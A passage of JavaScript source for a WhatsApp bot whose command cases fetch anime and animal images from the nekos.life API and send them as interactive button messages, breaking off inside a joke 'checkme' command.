          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: ArielStore.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"TENTANG AESPI BOTZ\",\"url\":\"https://linktr.ee/arielstore2072\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"BACK TO MENU","id":"${prefix}menu"}`
              }
           ],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: ftroli })
return await ArielStore.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animepat':{
await aespispStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/pat`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: ArielStore.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"TENTANG AESPI BOTZ\",\"url\":\"https://linktr.ee/arielstore2072\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"BACK TO MENU","id":"${prefix}menu"}`
              }
           ],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: ftroli })
return await ArielStore.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animeslap':{
await aespispStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/slap`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: ArielStore.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"TENTANG AESPI BOTZ\",\"url\":\"https://linktr.ee/arielstore2072\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"BACK TO MENU","id":"${prefix}menu"}`
              }
           ],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: ftroli })
return await ArielStore.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animecuddle':{
await aespispStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/cuddle`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: ArielStore.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"TENTANG AESPI BOTZ\",\"url\":\"https://linktr.ee/arielstore2072\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"BACK TO MENU","id":"${prefix}menu"}`
              }
           ],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: ftroli })
return await ArielStore.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animewaifu':{
await aespispStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/waifu`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: ArielStore.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"TENTANG AESPI BOTZ\",\"url\":\"https://linktr.ee/arielstore2072\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"BACK TO MENU","id":"${prefix}menu"}`
              }
           ],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: ftroli })
return await ArielStore.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animenom':{
await aespispStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/nom`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: ArielStore.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"TENTANG AESPI BOTZ\",\"url\":\"https://linktr.ee/arielstore2072\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"BACK TO MENU","id":"${prefix}menu"}`
              }
           ],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: ftroli })
return await ArielStore.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animefoxgirl':{
await aespispStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/fox_girl`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: ArielStore.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"TENTANG AESPI BOTZ\",\"url\":\"https://linktr.ee/arielstore2072\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"BACK TO MENU","id":"${prefix}menu"}`
              }
           ],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: ftroli })
return await ArielStore.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animetickle': {
await aespispStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/tickle`)     
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: ArielStore.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"TENTANG AESPI BOTZ\",\"url\":\"https://linktr.ee/arielstore2072\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"BACK TO MENU","id":"${prefix}menu"}`
              }
           ],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: ftroli })
return await ArielStore.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animegecg': {
await aespispStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/gecg`)     
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: ArielStore.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"TENTANG AESPI BOTZ\",\"url\":\"https://linktr.ee/arielstore2072\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"BACK TO MENU","id":"${prefix}menu"}`
              }
           ],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: ftroli })
return await ArielStore.relayMessage(m.chat, msgs.message, {})
                }
break
case 'dogwoof': {
await aespispStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/woof`)     
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: ArielStore.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"TENTANG AESPI BOTZ\",\"url\":\"https://linktr.ee/arielstore2072\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"BACK TO MENU","id":"${prefix}menu"}`
              }
           ],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: ftroli })
return await ArielStore.relayMessage(m.chat, msgs.message, {})
                }
break
case '8ballpool': {
await aespispStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/8ball`)     
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: ArielStore.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"TENTANG AESPI BOTZ\",\"url\":\"https://linktr.ee/arielstore2072\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"BACK TO MENU","id":"${prefix}menu"}`
              }
           ],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: ftroli })
return await ArielStore.relayMessage(m.chat, msgs.message, {})
                }
break
case 'goosebird': {
await aespispStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/goose`)     
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: ArielStore.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"TENTANG AESPI BOTZ\",\"url\":\"https://linktr.ee/arielstore2072\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"BACK TO MENU","id":"${prefix}menu"}`
              }
           ],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: ftroli })
return await ArielStore.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animefeed': {
await aespispStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/feed`)     
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: ArielStore.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"TENTANG AESPI BOTZ\",\"url\":\"https://linktr.ee/arielstore2072\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"BACK TO MENU","id":"${prefix}menu"}`
              }
           ],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: ftroli })
return await ArielStore.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animeavatar': {
await aespispStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/avatar`)     
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: ArielStore.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"TENTANG AESPI BOTZ\",\"url\":\"https://linktr.ee/arielstore2072\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"BACK TO MENU","id":"${prefix}menu"}`
              }
           ],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: ftroli })
return await ArielStore.relayMessage(m.chat, msgs.message, {})
                }
break
case 'lizardpic': {
await aespispStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/lizard`)     
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: ArielStore.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"TENTANG AESPI BOTZ\",\"url\":\"https://linktr.ee/arielstore2072\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"BACK TO MENU","id":"${prefix}menu"}`
              }
           ],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: ftroli })
return await ArielStore.relayMessage(m.chat, msgs.message, {})
                }
break
case 'catmeow': {
await aespispStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/meow`)     
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: ArielStore.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"TENTANG AESPI BOTZ\",\"url\":\"https://linktr.ee/arielstore2072\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"BACK TO MENU","id":"${prefix}menu"}`
              }
           ],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: ftroli })
return await ArielStore.relayMessage(m.chat, msgs.message, {})
                }
break
case 'anime': {
if (!text) return replygcaespisp(`Which anime are you lookin for?`)
const malScraper = require('mal-scraper')
await aespispStickWait()
        const anime = await malScraper.getInfoFromName(text).catch(() => null)
        if (!anime) return replygcaespisp(`Could not find`)
let animetxt = `
🎀 *Title: ${anime.title}*
🎋 *Type: ${anime.type}*
🎐 *Premiered on: ${anime.premiered}*
💠 *Total Episodes: ${anime.episodes}*
📈 *Status: ${anime.status}*
💮 *Genres: ${anime.genres}
📍 *Studio: ${anime.studios}*
🌟 *Score: ${anime.score}*
💎 *Rating: ${anime.rating}*
🏅 *Rank: ${anime.ranked}*
💫 *Popularity: ${anime.popularity}*
♦️ *Trailer: ${anime.trailer}*
🌐 *URL: ${anime.url}*
❄ *Description:* ${anime.synopsis}*`
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of ${text}*_\n\n${animetxt}`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:anime.picture}}, { upload: ArielStore.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"TENTANG AESPI BOTZ\",\"url\":\"https://linktr.ee/arielstore2072\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"BACK TO MENU","id":"${prefix}menu"}`
              }
           ],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: ftroli })
return await ArielStore.relayMessage(m.chat, msgs.message, {})
                
                }
                break
case 'gasm':{
if (!m.isGroup) return aespispStickGroup()
	if (!AntiNsfw) return replygcaespisp(mess.nsfw)
await aespispStickWait()						
 waifudd = await axios.get(`https://nekos.life/api/v2/img/${command}`)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: ArielStore.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"TENTANG AESPI BOTZ\",\"url\":\"https://linktr.ee/arielstore2072\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"BACK TO MENU","id":"${prefix}menu"}`
              }
           ],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: ftroli })
return await ArielStore.relayMessage(m.chat, msgs.message, {})
}
break  
case 'checkme':{
					neme = args.join(" ")
					bet = `${sender}`
					var sifat = ['Fine','Unfriendly','Chapri','Nibba/nibbi','Annoying','Dilapidated','Angry person','Polite','Burden','Great','Cringe','Liar']
					var hoby = ['Cooking','Dancing','Playing','Gaming','Painting','Helping Others','Watching anime','Reading','Riding Bike','Singing','Chatting','Sharing Memes','Drawing','Eating Parents Money','Playing Truth or Dare','Staying Alone']
					var bukcin = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var arp = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var cakep = ['Yes','No','Very Ugly','Very Handsome']
					var wetak= ['Caring','Generous','Angry person','Sorry','Submissive','Fine','Im sorry','Kind Hearted','Patient','UwU','Top','Helpful']
					var baikk = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var bhuruk = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
